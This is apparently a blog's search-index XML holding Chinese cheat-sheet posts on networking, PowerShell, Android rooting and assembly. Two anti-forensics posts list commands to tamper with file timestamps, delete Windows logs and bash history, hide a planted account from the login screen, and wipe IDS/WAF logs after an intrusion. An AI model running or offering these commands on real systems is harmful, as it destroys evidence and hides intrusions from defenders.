<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>802.11协议分析</title>
    <url>/2018/05/11/80211/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP协议分析</title>
    <url>/2018/05/11/HTTP/</url>
    <content><![CDATA[<p>HTTP(Hypertext Transfer Protocol，超文本传输协议)</p>
<h2 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h2><h3 id="HTTP请求报文"><a href="#HTTP请求报文" class="headerlink" title="HTTP请求报文"></a>HTTP请求报文</h3><p><img src="/images/http-request.PNG"></p>
<a id="more"></a>
<p>方法字段可以取几种不同的值，包括<strong>GET</strong>、<strong>POST</strong>、<strong>HEAD</strong>、<strong>PUT</strong>和<strong>DELETE</strong>。绝大部分的HTTP请求报文使用GET方法。</p>
<p><strong>Host</strong>首部行指明对象所在的主机，该信息是Web代理高速缓存所要求的；<strong>Connection</strong>首部行指明采用非持续连接还是持续连接；<strong>User-Agent</strong>首部行指明用户代理；<strong>Accept-Language</strong>首部行指明用户想得到的语言版本。</p>
<p>使用GET方法时实体体(entity body)为空，而使用POST方法时才使用该实体体。</p>
<p>HEAD方法类似于GET方法。当服务器收到使用HEAD方法的请求时，将会用一个HTTP报文进行响应，但是并不返回请求对象。应用程序开发者常用HEAD方法进行调试跟踪。PUT方法常与Web发行工具联合使用，它运行用户上传对象到指定的Web服务器上指定的路径(目录)。PUT方法也被那些需要向Web服务器上传对象的应用程序使用。DELETE方法允许用户或者应用程序删除Web服务器上的对象。</p>
<h3 id="HTTP响应报文"><a href="#HTTP响应报文" class="headerlink" title="HTTP响应报文"></a>HTTP响应报文</h3><p><img src="/images/http-response.PNG"><br><strong>Date</strong>首部行指示服务器产生并发送该响应报文的日期和时间；<strong>Last-Modified</strong>首部行指示了对象创建或者最后修改的日期和时间；<strong>Server</strong>首部行指示服务器类型，类似于User-Agent首部行；<strong>Content-Length</strong>首部行指示了被发送对象中的字节数；<strong>Content-Type</strong>首部行指示了实体体中的对象的MIME类型。</p>
<p>常见的状态码和其对应的短语：<br>200 OK：请求成功，信息在返回的响应报文中。<br>301 Moved Permanently：请求的对象已经被 <strong>永久</strong> 转移了，新的URL定义在响应报文的Location首部行中。客户软件将自动获取新的URL。<br>302 Moved Temporarily：请求的对象已经被 <strong>暂时</strong> 转移了，新的URL定义在响应报文的Location首部行中。客户软件将自动获取新的URL。<br>400 Bad Request：一个通用差错代码，指示该请求不能被服务器理解。<br>403 Forbidden：客户端没有权限访问此资源。<br>404 Not Found：被请求的文档不在服务器上。<br>505 HTTP Version Not Supported：服务器不支持请求报文使用的HTTP协议版本。</p>
<p>一般而言，200系列代表正常，300系列代表重定向，400系列代表客户端错误，500系列代表服务端错误。</p>
<h2 id="Web缓存"><a href="#Web缓存" class="headerlink" title="Web缓存"></a>Web缓存</h2><p><strong>条件GET(conditional GET)方法</strong>：请求报文使用GET方法，并且请求报文中包含一个<strong>If-Modified-Since</strong>首部行。</p>
<p>Web缓存器为了验证所缓存的对象是否是最新的，会使用条件GET方法向目标服务器发送一个请求报文，If-Modified-Since首部行的值为当初缓存对象时响应报文中Last-Modified首部行的值。如果所要验证的对象是最新的，即没有被修改过，则目标服务器会返回一个“304 Not Modified”响应报文，其中实体体为空。</p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol>
<li>HTTP是一个无状态协议(stateless protocol)。</li>
<li>HTTP可以采用非持续连接或持续连接，默认采用持续连接。</li>
</ol>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>MIME Type</title>
    <url>/2018/05/09/MIME-Type/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>关于PowerShell</title>
    <url>/2018/07/16/about-powershell/</url>
    <content><![CDATA[<p>PowerShell是微软用来取代CMD的一个强大的Shell。</p>
<h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>在不同版本的Windows中已经内置了不同版本的PowerShell，常见情况如下：</p>
<ul>
<li>Windows XP SP2 / Server 2003 SP1：PowerShell 1.0</li>
<li>Windows 7 / Server 2008：PowerShell 2.0，此版本包含了PowerShell ISE，即Integrated Scripting Environment(集成的脚本环境)，用来方便的编写PowerShell脚本。</li>
<li>Windows 8 / Server 2012：PowerShell 3.0，从此版本开始，PowerShell被集成进了WMF中，即Windows Management Framework(Windows管理框架)。</li>
<li>Windows 8.1 / Server 2012 R2：PowerShell 4.0</li>
<li>Windows 10：PowerShell 5.0，此版本的WMF包含了PowerShellGet，可用于在线下载、安装模块。</li>
</ul>
<a id="more"></a>
<h2 id="优势及劣势"><a href="#优势及劣势" class="headerlink" title="优势及劣势"></a>优势及劣势</h2><p>PowerShell相较于CMD的优势是不言而喻的，相较于Unix中的Shell，它的优势主要体现在2方面：面向对象特性以及与.NET的深度结合。<br>劣势当然也有，相较于CMD，至今为止它的启动速度仍然较慢，相较于Unix中的Shell，它的生态环境还欠火候，可以期待未来有更多的人关注到PowerShell。</p>
<h2 id="Cmdlets与pipeline"><a href="#Cmdlets与pipeline" class="headerlink" title="Cmdlets与pipeline"></a>Cmdlets与pipeline</h2><p>Cmdlets与pipeline是PowerShell中的两个核心概念，</p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>PowerShell中的大多数常用命令都有对应于Linux中相关命令的别名，比如<code>ls</code>、<code>mv</code>、<code>ps</code>、<code>cat</code>、<code>kill</code>、<code>wget</code>、<code>clear</code>等，下面介绍的命令为PowerShell所不同于Linux中的命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看PowerShell版本信息</span></span><br><span class="line">Get-Host</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看帮助信息</span></span><br><span class="line"><span class="built_in">help</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有已经设置的别名</span></span><br><span class="line">Get-Alias</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从powershellgallery.com下载安装第三方模块</span></span><br><span class="line">Install-Module</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入模块，安装的模块需要先导入才能使用</span></span><br><span class="line">Import-Module</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载模块</span></span><br><span class="line">Uninstall-Module</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新模块</span></span><br><span class="line">Update-Module</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出已安装模块</span></span><br><span class="line">Get-InstalledModule</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看PowerShellGet模块有哪些命令</span></span><br><span class="line">Get-Command -Module PowerShellGet</span><br><span class="line"></span><br><span class="line"><span class="comment"># 升级帮助手册</span></span><br><span class="line">Update-Help</span><br></pre></td></tr></table></figure>

<h2 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h2><ul>
<li><a href="https://github.com/dahlbyk/posh-git">posh-git</a>：PowerShell中的Git增强模块</li>
<li><a href="https://github.com/JanDeDobbeleer/oh-my-posh">oh-my-posh</a>：类似于oh-my-zsh</li>
<li><a href="https://github.com/lzybkr/PSReadLine">PSReadline</a>：一个增强的命令行编辑模块</li>
<li><a href="https://github.com/JulianChow94/Windows-screenFetch">windows-screenfetch</a>：Windows下的screenfetch模块</li>
</ul>
<h2 id="Microsoft-PowerShell-profile-ps1"><a href="#Microsoft-PowerShell-profile-ps1" class="headerlink" title="Microsoft.PowerShell_profile.ps1"></a>Microsoft.PowerShell_profile.ps1</h2><p>和一般的Linux中的Shell一样，PowerShell也有一个配置文件，即<code>Microsoft.PowerShell_profile.ps1</code>，当PowerShell运行时会默认加载此配置文件中的设置。一般而言，用户级别的配置文件位于<code>%HOMEPATH%\Documents\WindowsPowerShell</code>下，当然，你也可以使用<code>echo $profile</code>命令查看具体的位置。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>关于代理那些事</title>
    <url>/2018/07/26/about-proxy/</url>
    <content><![CDATA[<h2 id="正向连接与反向连接"><a href="#正向连接与反向连接" class="headerlink" title="正向连接与反向连接"></a>正向连接与反向连接</h2><p><strong>正向连接</strong>即黑客主动连接受害者，这种情况下要求受害者有公网IP，常用于对服务器的渗透；<strong>反向连接</strong>即受害者主动连接黑客，这种情况下要求黑客有公网IP，常用于对个人的渗透。</p>
<h2 id="正向代理与反向代理"><a href="#正向代理与反向代理" class="headerlink" title="正向代理与反向代理"></a>正向代理与反向代理</h2><p>在英语中，<strong>Proxy</strong>表示<strong>服务器代理</strong>这种动作，而<strong>Agent</strong>表示<strong>代理服务器</strong>这种物质，显然，我们这里讨论的是Proxy这种动作，而非代理服务器本身。<br>不论正向还是反向，代理都是基于这样一个事实：即A与B的通信要经过C的转发，这里的C就是Agent，为了方便讨论，我们将A视为客户端，将B视为服务器端。<br><strong>正向代理</strong>(Forward Proxy)：也就是常说的代理，代理服务器偏向于客户端，服务器端只能得到代理服务器的IP地址，隐藏了客户端的IP地址。常用于科学上网工具。<br><strong>反向代理</strong>(Reverse Proxy)：代理服务器偏向于服务器端，客户端只能得到代理服务器的IP地址，隐藏了服务器端的IP地址。常用于网站镜像等。</p>
<a id="more"></a>

<h2 id="端口转发与端口映射"><a href="#端口转发与端口映射" class="headerlink" title="端口转发与端口映射"></a>端口转发与端口映射</h2><p>传统意义上，我们认为<strong>端口转发</strong>(Port Forwarding)与<strong>端口映射</strong>(Port Mapping)表达同样的内容。顾名思义，端口转发指的是将某个IP的某个端口转发到另一个IP的另一个端口，这样，可以通过访问后者以达到访问前者的目的。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>关于 Windows 的代理设置</title>
    <url>/2019/07/29/about-the-proxy-settings-for-windows/</url>
    <content><![CDATA[<p>Windows 的<strong>系统代理</strong>使用的其实是 <strong>IE 的代理设置</strong>，此外，对于<strong>绝大多数</strong>的应用程序而言，它们默认使用的也是 IE 的代理设置，比如，Chrome、Firefox、Microsoft Store 等。因此，如果想让绝大多数的应用程序使用代理，一个简单的方法是直接设置 IE 的代理（即系统代理）。不过，对于一小部分没有使用 IE 代理设置的应用程序，比如 Android Studio 等，你可能需要单独设置它们的代理（一般在软件的设置项中）。</p>
<p>值得注意的是，同为应用程序的 <strong>Shell</strong>（包括<strong>命令提示符</strong>和 <strong>PowerShell</strong>）就没有使用 IE 的代理设置，它们各自有自己的代理设置。具体而言，要为命令提示符设置代理，可使用如下两条命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set HTTP_PROXY&#x3D;http:&#x2F;&#x2F;user:password@proxy.domain.com:port</span><br><span class="line">set HTTPS_PROXY&#x3D;https:&#x2F;&#x2F;user:password@proxy.domain.com:port</span><br></pre></td></tr></table></figure>
<p>而要为 PowerShell 设置代理则要使用<a href="">这个脚本</a>。</p>
<p>最后，对于 Shell 中运行的程序，有一部分使用的是 IE 的代理设置，比如 <code>pip</code>、<code>git</code>、<code>npm</code> 等，另一部分则使用的是 Shell 的代理设置，比如 <code>curl</code>、<code>gem</code> 等。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>ADB小记</title>
    <url>/2019/07/29/adb/</url>
    <content><![CDATA[<h2 id="相关问题"><a href="#相关问题" class="headerlink" title="相关问题"></a>相关问题</h2><h3 id="error-device-still-connecting"><a href="#error-device-still-connecting" class="headerlink" title="error: device still connecting"></a>error: device still connecting</h3><p>输入<code>adb shell</code>时显示<code>error: device still connecting</code>，一般可通过：关闭<strong>开发者模式</strong>然后重新打开<strong>开发者模式</strong>，接着开启<strong>USB调试</strong>并重新和电脑配对，即可解决。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>高级搜索技巧</title>
    <url>/2018/11/20/advanced-search-tips/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Android Studio模拟器相关问题解决</title>
    <url>/2018/08/21/android-emulator-problem/</url>
    <content><![CDATA[<h2 id="网络问题"><a href="#网络问题" class="headerlink" title="网络问题"></a>网络问题</h2><a id="more"></a>
<h2 id="命令行启动"><a href="#命令行启动" class="headerlink" title="命令行启动"></a>命令行启动</h2><p>Android SDK工具包中包含着一个模拟器的命令行程序 —— <code>emulator</code>，它可以在不启动Android Studio的情况下开启Android模拟器，在Windows系统中，<code>emulator</code>位于<code>%LOCALAPPDATA%\Android\Sdk\tools</code>文件夹下，<code>emulator -list-avds</code>命令可以列出所有已创建的AVD，<code>emulator -avd &lt;avd-name&gt;</code>命令即可启动相应的AVD，要查看<code>emulator</code>更多的参数，可以使用<code>emulator -help</code>。</p>
<h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><p>建议创建的AVD为Pixel，版本为Android 7.1.1。</p>
]]></content>
      <categories>
        <category>Bug</category>
      </categories>
  </entry>
  <entry>
    <title>谈谈Android的root</title>
    <url>/2018/09/18/android-root/</url>
    <content><![CDATA[<p>Android的内核是Linux，所以Android的root和Linux的root有些许关系，不妨先回顾一下Linux中是如何获取root的。</p>
<h2 id="Linux相关"><a href="#Linux相关" class="headerlink" title="Linux相关"></a>Linux相关</h2><p>在Linux中获得root权限有2个命令，<code>su</code>与<code>sudo</code>，<code>sudo</code>只是为了短暂的获得root权限以执行某些操作(superuser do)，而<code>su</code>其实是为了切换用户(switch user)，但当其不带参数直接执行时，默认为切换到root用户。使用<code>sudo</code>执行某些需要root权限的操作时，需要输入当前用户的密码；而直接使用<code>su</code>切换到root用户时，需要输入root用户的密码。<br>在Linux中，文件的权限有<code>rwx</code>三种，即可读(read)、可写(write)、可执行(execute)，其中<code>r</code>又等于4，<code>w</code>等于2，<code>x</code>等于1。所以，如果一个文件同时具有<code>rwx</code>权限，那么它的权限位就等于7。</p>
<a id="more"></a>
<h2 id="Android相关"><a href="#Android相关" class="headerlink" title="Android相关"></a>Android相关</h2><p>Android本身是不愿意让用户获得root权限的，所以Android中没有<code>su</code>或<code>sudo</code>这些命令。所以，获得root权限的第一步就是要把<code>su</code>命令拷贝到Android的<code>/system/bin</code>或<code>/system/xbin</code>目录下。但是拷贝之后并不能直接使用<code>su</code>命令，因为Android中<code>su</code>的运行机制和Linux中不同。在Android中只有root用户才能使用<code>su</code>命令，非root用户无权使用<code>su</code>命令。这其实是一个逻辑闭环：使用<code>su</code>命令可以切换到root，但只有root用户才可以使用<code>su</code>命令。好在Linux中文件的权限除了<code>rwx</code>三种之外，还有<code>s</code>权限，<code>s</code>代表当任何一个用户执行该文件时都拥有文件所有者的权限，换句话来说，如果一个文件的所有者是root，且它的执行权限标志位是<code>s</code>，那么不管谁执行这个文件，他执行的时候都是以root身份执行的。<br>基于以上，Android获取root权限大致可以分为如下3步：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 拷贝su到指定目录下</span></span><br><span class="line">cp /data/tmp/su /system/bin/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将su所有者设为root</span></span><br><span class="line">chown root:root su</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将su标志位设为-rwsr-xr-x</span></span><br><span class="line">chmod 4775 /system/bin/su</span><br></pre></td></tr></table></figure>
<p>但是，除了上面第一步以外，剩下两步都需要root权限才能成功执行，这就又造成了一个逻辑闭环：即通过上面的代码可以获得root权限，但必须有root权限才能执行上面的代码。这时的解决办法就是寻找Android系统的漏洞，系统中有些进程是以root权限运行的，只有找出那些有漏洞的进程，然后利用缓冲区溢出让其执行我们上面的命令，即可完成root。<br>所以，总的来说，Android获取root权限最重要的一步，就是寻找系统的漏洞，然后利用之。</p>
<h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><p>了解了Android root的基本原理后，需要理清一些常用术语：</p>
<h3 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h3><h3 id="Bootloader"><a href="#Bootloader" class="headerlink" title="Bootloader"></a>Bootloader</h3><h3 id="线刷"><a href="#线刷" class="headerlink" title="线刷"></a>线刷</h3><h3 id="卡刷"><a href="#卡刷" class="headerlink" title="卡刷"></a>卡刷</h3><h2 id="Nexus的root"><a href="#Nexus的root" class="headerlink" title="Nexus的root"></a>Nexus的root</h2><p>Nexus系列作为Google的亲儿子，自然少不了root解决方案，目前root Nexus设备使用最多的软件是<a href="http://www.wugfresh.com/nrt/">Nexus Root Toolkit(NRT)</a>。请注意，此软件运行前会先进行更新，这会花费较长的时间，需要耐心等待。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Android刷机指南</title>
    <url>/2019/03/23/android-shuaji-guide/</url>
    <content><![CDATA[<h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><h3 id="软重启与硬重启"><a href="#软重启与硬重启" class="headerlink" title="软重启与硬重启"></a>软重启与硬重启</h3><p><strong>软重启</strong>（又称<strong>热重启</strong>）是指从操作系统层面上关机再开机，而<strong>硬重启</strong>（又称<strong>冷重启</strong>）是指直接关掉电源再开机。类似的，也有<strong>软（热）关机</strong>和<strong>硬（冷）关机</strong>，其区别类似于在Windows“开始”菜单中点击关机和直接关掉主机电源的区别。一般而言，软（热）关机对设备更好。</p>
<a id="more"></a>
<h3 id="Bootloader-fastboot-Recovery"><a href="#Bootloader-fastboot-Recovery" class="headerlink" title="Bootloader/fastboot/Recovery"></a>Bootloader/fastboot/Recovery</h3><h3 id="Full-OTA-Image与Factory-Image"><a href="#Full-OTA-Image与Factory-Image" class="headerlink" title="Full OTA Image与Factory Image"></a>Full OTA Image与Factory Image</h3><h2 id="刷机流程"><a href="#刷机流程" class="headerlink" title="刷机流程"></a>刷机流程</h2><ol start="0">
<li>提前备份必要的数据（下载的音乐、视频，QQ、微信的聊天记录，通话记录、短信、通讯录，相册等），尽量保持电量满。</li>
<li>恢复出厂设置（亦或，取消所有安全机制，如屏幕锁定等，并退出Google账号。）。</li>
<li>在开发者选项中开启USB调试。</li>
<li>解锁Bootloader（需要的话）。</li>
<li>刷入第三方Recovery，如TWRP。<a href="https://twrp.me/">https://twrp.me/</a></li>
<li>从TWRP中安装第三方ROM，顺便root。</li>
</ol>
<h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="开机无限进入TWRP"><a href="#开机无限进入TWRP" class="headerlink" title="开机无限进入TWRP"></a>开机无限进入TWRP</h3><p>碰到这种情况，你可能需要格式化Data分区。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>反取证之Linux</title>
    <url>/2018/05/02/anti-forensics-linux/</url>
    <content><![CDATA[<p>后渗透测试阶段的重要工作便是擦除痕迹，也即反取证，文件系统访问都会留下痕迹，最好的避免计算机取证的方法就是不要碰文件系统，这也是meterpreter的先天优势，它完全基于内存，Linux中的反取证主要涉及MAC时间、日志文件、history：</p>
<h2 id="MAC时间"><a href="#MAC时间" class="headerlink" title="MAC时间"></a>MAC时间</h2><p>MAC即Modified/Accessed/Changed，也就是修改/访问/更改时间，修改时间指对文件内容修改时的时间，访问时间指对文件内容访问时的时间(例如通过cat查看时)，更改时间指对文件属性、权限更改时的时间。使用<code>ls -l</code>默认查看的是修改时间，要查看其余2个时间，可以加参数<code>ls -l --time=atime/ctime</code>，另一个查看MAC时间的命令是<code>stat</code>。使用<code>touch -d &quot;5 days ago&quot;</code>或<code>touch -t 1805021030</code>可以修改MAC中的MA时间。meterpreter中的<code>timestomp</code>命令可以方便的修改MAC时间。</p>
<a id="more"></a>
<h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><p>清除相关日志文件</p>
<h3 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h3><p>Linux中的日志文件主要有/var/log/auth.log、/var/log/secure、/var/log/wtmp、/var/log/btmp、/var/log/lastlog、/var/log/faillog。<br>Debian系的auth.log文件与RedHat系的secure文件都记录了系统的登录日志，<code>last</code>命令用于查看登录日志以及重启日志，文件位于/var/log/wtmp；<code>lastb</code>命令用于查看登录失败日志，文件位于/var/log/btmp；<code>lastlog</code>命令用于查看所有用户最近一次登录日志，文件位于/var/log/lastlog；<code>faillog</code>命令与<code>lastlog</code>命令一样，用于查看用户登录失败日志，文件位于/var/log/faillog，此命令仅限于Debian系。</p>
<h3 id="Web日志"><a href="#Web日志" class="headerlink" title="Web日志"></a>Web日志</h3><p>Apache的日志文件位于/var/log/apache2；Nginx的日志文件位于/var/log/nginx。</p>
<h2 id="history"><a href="#history" class="headerlink" title="history"></a>history</h2><p>Linux中，每次输入的命令都会记录在用户文件夹中的.bash_history文件中，默认记录1000条命令，使用<code>history</code>命令即可查看，清除记录的方法是使用<code>history -c</code>命令。另一种清除记录的方法是更改.bash_history文件的属性，使用命令：<code>chattr +i .bash_history</code>使其不可被更改，从而无法向其写入任何数据。</p>
<p><strong>最后，请不要忘记HIDS/IPS/WAF/集中的日志服务器的痕迹擦除。</strong></p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>计算机取证</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>反取证之Windows</title>
    <url>/2018/05/02/anti-forensics-windows/</url>
    <content><![CDATA[<h2 id="MACE时间"><a href="#MACE时间" class="headerlink" title="MACE时间"></a>MACE时间</h2><p>和<a href="https://howiezhao.github.io/2018/05/02/anti-forensics-linux/">反取证之Linux</a>中的一样，Windows也有MAC时间，不过在Windows中，C指的是Created，即创建时间，Windows中默认显示的是修改时间，另外，在Windows的NTFS文件系统中还有E时间，即MFT entry，其中包含了文件的大量信息，包括大小、名称、目录位置、磁盘位置、创建日期等，在擦除痕迹时也要擦除E时间，同样，meterpreter中的<code>timestomp</code>命令可以方便的修改MACE时间。</p>
<h2 id="隐藏新建账号"><a href="#隐藏新建账号" class="headerlink" title="隐藏新建账号"></a>隐藏新建账号</h2><p>当在目标系统上新建了用户账号后，通常会在登录界面上显示出来，要实现隐藏，可以修改注册表项，采用如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v uname /t REG_DWORD /d 0</span><br></pre></td></tr></table></figure>
<p>注意：这种隐藏只是在登录界面的隐藏，用户使用<code>net user</code>或“本地用户和组”仍然可以查到新建的账户。</p>
<h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><p>清除相关日志文件</p>
<h3 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h3><p>Windows系统日志文件一般存放在Windows文件夹下，可以使用如下命令删除之：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">del %windir%\*.<span class="built_in">log</span> /a/s/q/f</span><br></pre></td></tr></table></figure>
<p>另外，meterpreter中的<code>clearev</code>命令可以删除事件查看器中的日志信息。</p>
<h3 id="Web日志"><a href="#Web日志" class="headerlink" title="Web日志"></a>Web日志</h3><p>IIS的日志文件位于%windir%\System32\LogFiles目录下。</p>
<p><strong>最后，请不要忘记HIDS/IPS/WAF/集中的日志服务器的痕迹擦除。</strong></p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>渗透</tag>
        <tag>计算机取证</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言小记</title>
    <url>/2019/03/09/assembly/</url>
    <content><![CDATA[<p><strong>汇编语言</strong>（Assembly Language，简称 <strong>ASM</strong>）由<strong>汇编指令</strong>、<strong>伪指令</strong>和<strong>其他符号</strong>组成，其中汇编指令有对应的机器码，而伪指令和其他符号没有对应的机器码，仅由汇编器识别执行。</p>
<h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><p>汇编语言是依赖底层 CPU 架构的，不同的 CPU 架构拥有不同的汇编语言，比如，常用于 PC 的<strong>x86 汇编</strong>和常用于嵌入式设备的<strong>ARM 汇编</strong>。由于 x86 架构又分为 16 位、32 位、64 位等，其相应的汇编也有稍许不同。本文主要以 32 位 x86 汇编为例做简要介绍。</p>
<a id="more"></a>
<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>汇编语言的大部分指令都是直接操作 CPU 中的寄存器的，所以有必要了解以下 x86 架构的 CPU 中常见的寄存器。</p>
<p>16 位 x86 CPU 中常见的寄存器有：</p>
<ul>
<li>通用寄存器（<strong>8 个</strong>）：<ul>
<li>数据寄存器：<ul>
<li>AX：累加寄存器，Accumulator</li>
<li>BX：基址寄存器，Base</li>
<li>CX：计数寄存器，Count</li>
<li>DX：数据寄存器，Data</li>
</ul>
</li>
<li>指针寄存器：<ul>
<li>SP：堆栈指针寄存器，Stack Pointer</li>
<li>BP：基址指针寄存器，Base Pointer</li>
</ul>
</li>
<li>变址寄存器：<ul>
<li>SI：源变址寄存器，Source Index</li>
<li>DI：目的变址寄存器，Destinatin Index</li>
</ul>
</li>
</ul>
</li>
<li>段寄存器：<ul>
<li>CS：代码段寄存器，Code Segment</li>
<li>DS：数据段寄存器，Data Segment</li>
<li>SS：堆栈段寄存器，Stack Segment</li>
<li>ES：附加段寄存器，Extra Segment</li>
</ul>
</li>
<li>控制寄存器：<ul>
<li>IP：指令指针寄存器，Instruction Pointer</li>
<li>FLAGS：标志寄存器</li>
</ul>
</li>
</ul>
<p>为了保证兼容性，AX、BX、CX、DX 这四个寄存器都可分为两个可独立使用的 8 位寄存器来用，如 AX 可分为 <strong>AH</strong> 和 <strong>AL</strong>，其中 AH 代表高（High）8 位，AL 代表低（Low）8 位，其他 3 个也是如此。</p>
<p>32 位 x86 CPU 在 16 位的基础上增加了一些寄存器，那些和原来作用相同的寄存器一般会在前面加上 <code>E</code>，其中常见的寄存器有：</p>
<ul>
<li>通用寄存器（<strong>8 个</strong>）：EAX、EBX、ECX、EDX、ESP、EBP、ESI、EDI</li>
<li>段寄存器：CS、DS、SS、ES、FS、GS，增加的 FS、GS 和 ES 一样，属于附加段寄存器</li>
<li>指令指针寄存器：EIP</li>
<li>标志寄存器：EFLAGS</li>
<li>系统表寄存器：GDTR、LDTR、IDTR、TR</li>
<li>控制寄存器：CR0、CR1、CR2、CR3、CR4</li>
<li>调试寄存器：DR0、DR1、DR2、DR3、DR4、DR5、DR6、DR7</li>
<li>测试寄存器：TR0、TR1、TR2、TR3、TR4、TR5、TR6、TR7</li>
</ul>
<p>类似的，64 位又在 32 位的基础上增加了一些寄存器，那些和原来作用相同的寄存器一般会将前面的 <code>E</code> 改为 <code>R</code>，其中常见的寄存器有：</p>
<ul>
<li>通用寄存器（<strong>16 个</strong>）：RAX、RBX、RCX、RDX、RSP、RBP、RSI、RDI、R8、R9、R10、R11、R12、R13、R14、R15</li>
<li>指令指针寄存器：RIP</li>
<li>标志寄存器：RFLAGS</li>
</ul>
<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>常见的汇编指令如下：</p>
<ul>
<li><code>mov</code>：传送指令，两个操作对象的位数应该一致，如 <code>mov eax,ebx</code>，表示将 EBX 的值送入 EAX 中。8086 CPU 不支持将数据直接送入段寄存器的操作，要想实现此功能，只能用一个寄存器来进行中转。</li>
<li><code>add</code>：加法指令，两个操作对象的位数应该一致，如 <code>add eax,ebx</code>，表示将 EAX 和 EBX 相加，其值赋给 EAX。</li>
<li><code>sub</code>：减法指令，如 <code>sub eax,ebx</code>，表示用 EAX 减 EBX，其值赋给 EAX。</li>
<li><code>push</code>：</li>
<li><code>pop</code>：</li>
<li><code>jmp</code>：跳转指令，属于转移指令，如 <code>jmp 2AE3:3</code>，表示将 CS 设为 <code>2AE3H</code>，将 IP 设为 <code>0003H</code>，CPU 将从 CS:IP（即 <code>2AE33H</code>）处读取指令；<code>jmp eax</code> 表示将 EAX 的值赋给 IP，CS 保持不变。</li>
<li><code>jnz</code>：条件跳转指令，检查 EFLAGS 标志寄存器中的 ZF 位（零标志位）是否为 0，若不为 0，则跳转。</li>
<li><code>jz</code>：条件跳转指令，检查 EFLAGS 标志寄存器中的 ZF 位（零标志位）是否为 0，若为 0，则跳转。</li>
<li><code>in</code>：从 I/O 端口读取内容，如 <code>in al,21H</code>，表示从 21H 端口读取内容到 AL 中。</li>
<li><code>out</code>：向 I/O 端口写入内容，如 <code>out 21H,al</code>，表示将 AL 的值写入到 21H 端口中。</li>
<li><code>xor</code>：按位异或运算，即相同为 0，不同为 1，如 <code>xor eax,ebx</code>，表示将 EAX 和 EBX 按位异或，其值赋给 EAX。对同一个值进行异或，会使其得 0，汇编中常用这种方法得到 0，如 <code>xor eax,eax</code>。</li>
<li><code>or</code>：按位或运算，如 <code>or eax,ebx</code>，表示将 EAX 和 EBX 按位或，其值赋给 EAX。</li>
</ul>
<p>注意：汇编指令和寄存器名称不区分大小写。</p>
